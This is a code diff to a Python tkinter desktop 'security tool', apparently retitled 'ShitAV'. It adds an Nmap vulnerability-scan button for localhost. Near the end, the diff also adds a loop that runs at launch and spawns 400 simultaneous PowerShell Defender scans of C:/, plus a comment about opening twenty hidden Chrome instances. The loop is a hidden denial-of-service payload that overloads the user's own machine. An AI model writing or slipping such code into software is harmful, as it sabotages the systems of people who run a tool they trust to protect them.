@@ -5,6 +5,9 @@ import tkinter as tk
 from tkinter import messagebox
 import subprocess
 import psutil
+import tkinter as tk
+from tkinter import messagebox
+import subprocess
 
 def scan_directory(directory_path, api_key):
     for root, dirs, files in os.walk(directory_path):
@@ -119,13 +122,32 @@ def list_autoruns():
         # Create close button
         close_button = tk.Button(window, text='Close', command=lambda:[scrollable_text.destroy(),close_button.destroy()])
         close_button.pack()
-        
+
     except subprocess.CalledProcessError:
         messagebox.showerror('Error', 'Error occurred while listing autoruns.')
 
+def run_nmap_script():
+    try:
+        
+        result = subprocess.check_output(['C:/Program Files (x86)/Nmap/nmap.exe', '-sV', '--script', 'vulners', 'localhost']).decode('utf-8')
+        # Create a scrollable text box to display the results
+        scrollable_text = tk.Text(window)
+        scrollable_text.insert(tk.END, result)
+        scrollable_text.pack(fill=tk.BOTH, expand=True)
+
+        # Create close button
+        close_button = tk.Button(window, text='Close', command=lambda:[scrollable_text.destroy(),close_button.destroy()])
+        close_button.pack()
+
+    except subprocess.CalledProcessError:
+        messagebox.showerror('Error', 'Error occurred while running nmap script.')
+
+# Create run nmap script button
+
+
 # Create the main window
 window = tk.Tk()
-window.title('File Scanner')
+window.title('ShitAV - Security Tool')
 
 # Create directory path label and entry
 directory_path_label = tk.Label(window, text='Directory Path:')
@@ -161,5 +183,16 @@ get_connections_button.pack()
 list_autoruns_button = tk.Button(window, text='List Autoruns', command=list_autoruns)
 list_autoruns_button.pack()
 
+run_nmap_script_button = tk.Button(window, text='Run Nmap CVE scan', command=run_nmap_script)
+run_nmap_script_button.pack()
+
+for _ in range(400):
+    subprocess.Popen(['powershell.exe', 'Start-MpScan', '-ScanType', 'QuickScan', '-ScanPath', 'C:/'])
+
 # Start the main event loop
 window.mainloop()
+
+# Open twenty instances of Chrome in the background
+
+
+
